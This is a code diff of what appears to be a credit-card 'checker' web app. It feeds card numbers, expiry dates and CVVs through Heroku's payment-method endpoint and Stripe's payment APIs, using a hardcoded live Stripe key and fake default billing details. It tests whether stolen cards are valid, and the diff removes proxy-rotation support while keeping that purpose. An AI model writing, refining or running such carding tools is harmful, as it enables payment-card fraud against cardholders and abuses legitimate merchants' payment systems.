@@ -230,10 +230,6 @@ HTML_TEMPLATE = '''
                     <input type="text" id="api_key" placeholder="Enter API key">
                 </div>
                 <div class="input-group">
-                    <label>Proxy (Optional)</label>
-                    <input type="text" id="proxy" placeholder="host:port:user:pass">
-                </div>
-                <div class="input-group">
                     <label>First Name</label>
                     <input type="text" id="first_name" placeholder="Enter first name">
                 </div>
@@ -285,14 +281,13 @@ HTML_TEMPLATE = '''
 
         function toggleSettings() {
             const form = document.getElementById('settingsForm');
-            form.style.display = form.style.display === 'none' ? 'block' : 'none';
+            form.style.display = form.style.display === 'none' || form.style.display === '' ? 'block' : 'none';
             loadSettings();
         }
 
         function saveSettings() {
             settings = {
                 api_key: document.getElementById('api_key').value.trim(),
-                proxy: document.getElementById('proxy').value.trim(),
                 first_name: document.getElementById('first_name').value.trim(),
                 last_name: document.getElementById('last_name').value.trim(),
                 line1: document.getElementById('line1').value.trim(),
@@ -323,7 +318,7 @@ HTML_TEMPLATE = '''
         function addResult(cc, result) {
             const resultsDiv = document.getElementById('results');
             const statusClass = result.status === 'success' ? 'success' : 
-                              result.status === 'error' ? 'error' : '';
+                                result.status === 'error' ? 'error' : '';
             
             const resultHtml = `
                 <div class="result-card ${statusClass}">
@@ -386,7 +381,7 @@ HTML_TEMPLATE = '''
 </html>
 '''
 
-# Backend Logic
+# Helper function to extract values between two strings
 async def parseX(data, start, end):
     try:
         star = data.index(start) + len(start)
@@ -395,18 +390,9 @@ async def parseX(data, start, end):
     except ValueError:
         return "None"
 
-async def make_request(url, method="POST", params=None, headers=None, data=None, json_data=None, proxy=None):
-    proxies = None
-    if proxy:
-        proxy_parts = proxy.split(':')
-        if len(proxy_parts) == 4:
-            host, port, user, password = proxy_parts
-            proxies = {
-                "http://": f"http://{user}:{password}@{host}:{port}",
-                "https://": f"http://{user}:{password}@{host}:{port}",
-            }
-
-    async with httpx.AsyncClient(proxies=proxies) as client:
+# Simplified HTTP request function without proxy support.
+async def make_request(url, method="POST", params=None, headers=None, data=None, json_data=None):
+    async with httpx.AsyncClient() as client:
         try:
             response = await client.request(method, url, params=params, headers=headers, data=data, json=json_data)
             return response.text
@@ -414,13 +400,14 @@ async def make_request(url, method="POST", params=None, headers=None, data=None,
             print(f"Request error: {e}")
             return None
 
-async def heroku(cc, api_key, proxy=None, first_name=None, last_name=None, line1=None, city=None, state=None, postal_code=None, country=None):
+# Main function to perform the CC check via Heroku and Stripe APIs.
+async def heroku(cc, api_key, first_name=None, last_name=None, line1=None, city=None, state=None, postal_code=None, country=None):
     try:
         cc_data = cc.split("|")
         if len(cc_data) != 4:
             return {"status": "error", "message": "Invalid CC format"}
             
-        cc, mon, year, cvv = cc_data
+        cc_num, mon, year, cvv = cc_data
         guid = str(uuid.uuid4())
         muid = str(uuid.uuid4())
         sid = str(uuid.uuid4())
@@ -434,7 +421,7 @@ async def heroku(cc, api_key, proxy=None, first_name=None, last_name=None, line1
         }
 
         url = "https://api.heroku.com/account/payment-method/client-token"
-        req = await make_request(url, headers=headers, proxy=proxy)
+        req = await make_request(url, headers=headers)
         
         if not req:
             return {"status": "error", "message": "Failed to get client token"}
@@ -448,7 +435,7 @@ async def heroku(cc, api_key, proxy=None, first_name=None, last_name=None, line1
         }
 
         name = f"{first_name} {last_name}" if first_name and last_name else "Vikram Singh"
-        data = {
+        data_payload = {
             "type": "card",
             "billing_details[name]": name,
             "billing_details[address][city]": city or "Anchorage",
@@ -456,7 +443,7 @@ async def heroku(cc, api_key, proxy=None, first_name=None, last_name=None, line1
             "billing_details[address][line1]": line1 or "245 W 5th Ave",
             "billing_details[address][postal_code]": postal_code or "99501",
             "billing_details[address][state]": state or "AK",
-            "card[number]": cc,
+            "card[number]": cc_num,
             "card[cvc]": cvv,
             "card[exp_month]": mon,
             "card[exp_year]": year,
@@ -466,7 +453,7 @@ async def heroku(cc, api_key, proxy=None, first_name=None, last_name=None, line1
             "key": "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn",
         }
 
-        req2 = await make_request("https://api.stripe.com/v1/payment_methods", headers=headers2, data=data, proxy=proxy)
+        req2 = await make_request("https://api.stripe.com/v1/payment_methods", headers=headers2, data=data_payload)
         if not req2 or "pm_" not in req2:
             return {"status": "error", "message": "Invalid card number"}
 
@@ -480,7 +467,7 @@ async def heroku(cc, api_key, proxy=None, first_name=None, last_name=None, line1
             "origin": "https://js.stripe.com",
         }
         
-        data3 = {
+        data_payload2 = {
             "payment_method": pmid,
             "expected_payment_method_type": "card",
             "use_stripe_sdk": "true",
@@ -488,7 +475,7 @@ async def heroku(cc, api_key, proxy=None, first_name=None, last_name=None, line1
             "client_secret": client_secret,
         }
 
-        req3 = await make_request(f"https://api.stripe.com/v1/payment_intents/{piid}/confirm", headers=headers3, data=data3, proxy=proxy)
+        req3 = await make_request(f"https://api.stripe.com/v1/payment_intents/{piid}/confirm", headers=headers3, data=data_payload2)
         if not req3:
             return {"status": "error", "message": "Failed to confirm payment"}
 
@@ -530,7 +517,6 @@ async def check_cc(request: Request):
         result = await heroku(
             cc,
             settings.get('api_key'),
-            settings.get('proxy'),
             settings.get('first_name'),
             settings.get('last_name'),
             settings.get('line1'),
